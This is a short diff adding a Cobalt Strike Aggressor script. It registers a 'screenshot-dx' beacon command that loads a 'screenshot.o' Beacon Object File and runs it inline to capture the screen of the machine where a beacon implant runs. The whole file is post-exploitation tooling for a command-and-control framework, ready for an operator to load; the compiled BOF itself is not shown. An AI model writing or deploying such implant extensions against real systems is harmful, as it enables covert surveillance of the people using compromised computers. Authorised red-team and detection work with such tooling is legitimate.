@@ -1,0 +1,19 @@
+beacon_command_register(
+	"screenshot-dx", "Take Screenshot.",
+	"INFO:\nTakes screenshot using directx9 and exports as a log file.\n\n" .
+	"USAGE:\nscreenshot-dx\n\n");
+	
+alias screenshot-dx {
+    $bid = $1;
+
+    # Read in the right BOF file
+    $handle = openf(script_resource("screenshot.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+	$arg_data  = bof_pack($bid);
+
+	blog($bid, "Tasked to take a screenshot..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+
+}
